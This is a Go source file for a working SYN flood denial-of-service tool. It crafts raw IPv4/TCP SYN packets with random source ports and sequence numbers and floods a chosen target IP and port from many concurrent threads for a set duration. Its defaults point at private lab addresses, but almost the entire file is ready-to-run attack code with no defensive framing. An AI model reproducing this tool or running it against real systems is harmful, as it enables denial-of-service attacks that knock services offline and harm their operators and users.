package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"golang.org/x/sys/unix"
)

type Config struct {
	srcIP      net.IP
	targetIP   net.IP
	targetPort uint16
	numThreads int
	duration   time.Duration
}

func main() {
	src := flag.String("src", "172.28.1.10", "Source IP address")
	target := flag.String("target", "172.28.2.20", "Target IP address")
	port := flag.Int("port", 80, "Target port")
	threads := flag.Int("threads", 10, "Number of concurrent threads")
	duration := flag.Int("duration", 10, "Duration in seconds")
	flag.Parse()

	config := Config{
		srcIP:      net.ParseIP(*src),
		targetIP:   net.ParseIP(*target),
		targetPort: uint16(*port),
		numThreads: *threads,
		duration:   time.Duration(*duration) * time.Second,
	}

	fmt.Printf("Starting SYN flood attack:\n")
	fmt.Printf("  Target: %s:%d\n", config.targetIP, config.targetPort)
	fmt.Printf("  Threads: %d\n", config.numThreads)
	fmt.Printf("  Duration: %v\n", config.duration)

	config.Start()
}

func (c *Config) Start() {
	var wg sync.WaitGroup

	// create a channel we can stop after duration
	stopChan := make(chan struct{})

	// start timmer
	go func() {
		time.Sleep(c.duration)
		close(stopChan)
	}()

	// start the same number of workers as threads
	for i := 0; i < c.numThreads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			c.worker(id, stopChan)
		}(i)
	}

	wg.Wait()
	fmt.Println("\nAttack completed")
}

func (c *Config) worker(id int, stopChan chan struct{}) {
	// open a raw socket
	conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
	if err != nil {
		log.Printf("Thread %d: Failed to open socket: %v", id, err)
		return
	}
	defer conn.Close()

	rawConn, err := conn.(*net.IPConn).SyscallConn()
	if err != nil {
		log.Printf("Thread %d: Failed to get raw connection: %v", id, err)
		return
	}
	var setsockErr error
	// Enable IP_HDRINCL for raw IP packet crafting
	rawConn.Control(func(fd uintptr) {
		// This allows us to include IP header
		setsockErr = unix.SetsockoptInt(int(fd), unix.IPPROTO_IP, unix.IP_HDRINCL, 1)
	})
	if setsockErr != nil {
		log.Printf("Thread %d: Failed to set IP_HDRINCL: %v", id, setsockErr)
		return
	}

	packetCount := 0
	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))

	for {
		select {
		case <-stopChan:
			fmt.Printf("Thread %d: Sent %d packets\n", id, packetCount)
			return
		default:
			if err := c.sendSynPacket(conn, rng); err != nil {
				log.Printf("Thread %d: Error sending packet: %v", id, err)
			}
			packetCount++
		}
	}
}

func (c *Config) sendSynPacket(conn net.PacketConn, rng *rand.Rand) error {
	// Random source port
	srcPort := layers.TCPPort(rng.Intn(65535-1024) + 1024)

	// Create IP layer
	ipLayer := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
		SrcIP:    c.srcIP,
		DstIP:    c.targetIP,
	}

	tsVal := uint32(time.Now().UnixNano() / 1e6) // ms
	tcpOpts := []layers.TCPOption{
		{OptionType: layers.TCPOptionKindMSS, OptionLength: 4, OptionData: []byte{0x05, 0xB4}}, // MSS 1460
		{OptionType: layers.TCPOptionKindNop},                                                  // pad for alignment
		{OptionType: layers.TCPOptionKindWindowScale, OptionLength: 3, OptionData: []byte{7}},  // WS=7
		{OptionType: layers.TCPOptionKindSACKPermitted, OptionLength: 2},                       // SACKOK
		{OptionType: layers.TCPOptionKindTimestamps, OptionLength: 10, OptionData: []byte{
			byte(tsVal >> 24), byte(tsVal >> 16), byte(tsVal >> 8), byte(tsVal),
			0, 0, 0, 0, // TSecr=0 for initial SYN
		}},
	}

	// Create TCP layer with SYN flag
	tcpLayer := &layers.TCP{
		SrcPort: srcPort,
		DstPort: layers.TCPPort(c.targetPort),
		Seq:     rng.Uint32(),
		Window:  65535,
		SYN:     true,
		Options: tcpOpts,
	}

	// Calculate TCP checksum
	tcpLayer.SetNetworkLayerForChecksum(ipLayer)

	// Serialize packet
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	if err := gopacket.SerializeLayers(buf, opts, ipLayer, tcpLayer); err != nil {
		return err
	}

	// Send packet
	addr := &net.IPAddr{IP: c.targetIP}
	_, err := conn.WriteTo(buf.Bytes(), addr)
	return err
}
